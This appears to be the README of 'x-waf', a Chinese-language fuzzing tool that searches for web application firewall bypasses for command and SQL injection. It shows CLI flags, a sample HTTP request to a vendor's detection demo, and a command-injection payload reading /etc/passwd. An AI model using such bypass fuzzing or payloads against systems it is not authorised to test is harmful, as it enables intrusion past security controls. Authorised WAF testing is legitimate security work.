一个基于fuzz的waf绕过测试工具，当前支持命令执行、SQL注入绕过。后续会支持更多绕过方式、攻击类型。

```
Usage:
  ./x-waf -target <request_file> [flags] [command]
  ./x-waf [command]

Available Commands:
  cmd         fuzz cmd injection
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  sql         fuzz sql injection

Flags:
      --debug-file-path string          specify request response log file path
      --fuzz-count int                  specify max fuzz times (default 10000000)
  -h, --help                            help for ./x-waf
      --justOutPutPayload               just output payload to payloads.txt
      --log-level string                specify log level, default is info (default "info")
      --target string                   specify the request file path
      --target-https                    specify whether the request is https protocol (default true)
      --target-mark string              specify the request fuzz position mark (default "%{{.*}}%")
      --waf-block-regex string          specify waf block regex
      --waf-block-rsp-status-code int   specify waf block response status code (default 403)

Use "./x-waf [command] --help" for more information about a command.
```

# 使用步骤
1、准备需要绕过的HTTP请求文件，例如：test.http

```
POST /demo/detect/ HTTP/1.1
Host: cmdchop.chaitin.com
accept: application/json, text/javascript, */*; q=0.01
accept-language: zh-CN,zh;q=0.9,en;q=0.8
content-type: application/json
cookie: _ga=GA1.2.212169703.1725506930; _ga_PNVRK9GRJ2=GS1.2.1725527773.2.1.1725529516.0.0.0; user_id=f62aa452-d92a-405a-9295-49aba0ed6d47; cid=dea7646d-7542-432f-858f-c745914a1e73; mid=c0b990d0-a3dc-455c-9f66-bac94da0b098
origin: https://cmdchop.chaitin.com
priority: u=1, i
referer: https://cmdchop.chaitin.com/demo/
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
sec-fetch-dest: empty
sec-fetch-mode: cors
sec-fetch-site: same-origin
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
x-requested-with: XMLHttpRequest
Content-Length: 50

{"type":"urlpath","payload":"/?p=cat /etc/passwd"}
```

2、将payload的位置用%{{.*}}%标记，例如：

```
{"type":"urlpath","payload":"/?p=%{{cat /etc/passwd}}%"}
```

3、运行命令：

```
./x_waf --target test/chatin-cmdchop.http --waf-block-regex payload cmd --fuzz-cmd-mode real
```

--fuzz-cmd-mode real 会实际执行命令，验证payload是否有效，当前只支持查看/etc/passwd文件内容

--fuzz-cmd-mode mock 会解析命令，验证payload是否有效，支持任意命令

--waf-block-regex payload 指定waf拦截时页面响应的匹配内容，支持正则表达式

4、查看bypass结果：

```
cat result.txt
```

# 注意事项
如果目标不是https，就加`--target-https=false`参数

# 运行截图
<img width="800" alt="image" src="https://github.com/user-attachments/assets/5d9bb89e-5a46-4e13-b203-3d43a3c68753">

# 交流群
<img width="300" alt="image" src="https://github.com/user-attachments/assets/c4394b37-1882-4e02-945b-8d615ec2ba18">


